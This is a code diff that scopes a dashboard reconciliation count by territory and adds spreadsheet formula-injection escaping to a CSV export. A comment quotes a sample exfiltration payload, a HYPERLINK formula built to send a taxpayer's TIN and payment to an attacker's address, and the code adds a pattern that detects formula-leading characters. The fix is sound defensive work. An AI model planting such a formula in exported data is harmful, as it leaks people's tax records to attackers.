@@ -152,9 +152,21 @@ export async function executiveDashboard(
            LEFT JOIN agents a ON a.id = f.agent_id
            WHERE f.status IN ('OPEN','UNDER_REVIEW')
              AND ($1 OR a.territory_id = ANY($2::uuid[]))) AS open_fraud_flags,
-         (SELECT count(*)::text FROM reconciliation_records
-           WHERE reconciled_at IS NULL
-             AND status IN ('MISSING_PAYMENT','MISSING_PLATFORM_TRANSACTION','AMOUNT_MISMATCH','DUPLICATE_PAYMENT'))
+         -- Scoped through the transaction that produced it. A record with no
+         -- transaction — a payment at the gateway with nothing on the platform
+         -- behind it — belongs to no territory, and by the same rule the
+         -- scope module applies to an unattributed collection it is outside
+         -- every territory scope rather than inside all of them. The statewide
+         -- picture stays where report:read:all can see it.
+         --
+         -- The two counts below are deliberately not scoped: a supervisor
+         -- holds approval:review and support:read:all, so the approval queue
+         -- and the ticket queue really are theirs to see whole.
+         (SELECT count(*)::text FROM reconciliation_records rr
+           LEFT JOIN transactions t ON t.id = rr.transaction_id
+           WHERE rr.reconciled_at IS NULL
+             AND rr.status IN ('MISSING_PAYMENT','MISSING_PLATFORM_TRANSACTION','AMOUNT_MISMATCH','DUPLICATE_PAYMENT')
+             AND ${tx})
            AS reconciliation_exceptions,
          (SELECT count(*)::text FROM approvals WHERE status IN ('REQUESTED','REVIEWED')) AS pending_approvals,
          (SELECT count(*)::text FROM support_tickets WHERE status IN ('OPEN','ASSIGNED','IN_PROGRESS')) AS open_tickets`,
@@ -454,12 +466,43 @@ export async function kpis(db: Db) {
 }
 
 /** CSV export for any report result set (PRD §48). */
+/**
+ * Characters a spreadsheet reads as "this cell is a program".
+ *
+ * Excel, LibreOffice and Google Sheets all evaluate a cell beginning with one
+ * of these. Tab and carriage return are here because they are stripped before
+ * that decision is made, so a leading tab hides the character that follows it.
+ */
+const FORMULA_LEAD = /^[\t\r]*[=+\-@]/;
+
+/** A value that is genuinely a number, which must survive the export as one. */
+const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;
+
 export function toCsv(rows: Record<string, unknown>[]): string {
   if (rows.length === 0) return '';
   const headers = Object.keys(rows[0]!);
   const escape = (value: unknown): string => {
     if (value === null || value === undefined) return '';
-    const text = value instanceof Date ? value.toISOString() : String(value);
+    let text = value instanceof Date ? value.toISOString() : String(value);
+
+    /*
+     * RFC 4180 escaping was here and is correct as far as the file format
+     * goes. It is not what breaks: quoting a cell does not stop a spreadsheet
+     * evaluating what is inside the quotes, so a taxpayer registered under the
+     * name =HYPERLINK("https://…"&A1,"Click for refund") exported cleanly and
+     * then offered to send the row beside it — a TIN and what that person paid
+     * — to an address of the attacker's choosing, from inside the revenue
+     * office, on one click.
+     *
+     * A leading apostrophe is the interoperable answer: every spreadsheet
+     * treats the rest of the cell as literal text and shows the value without
+     * it. Numbers are exempted because a report nobody can add up is not a
+     * report, and -1500 is an adjustment, not an attack.
+     */
+    if (FORMULA_LEAD.test(text) && !PLAIN_NUMBER.test(text)) {
+      text = `'${text}`;
+    }
+
     return /[",\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
   };
   return [
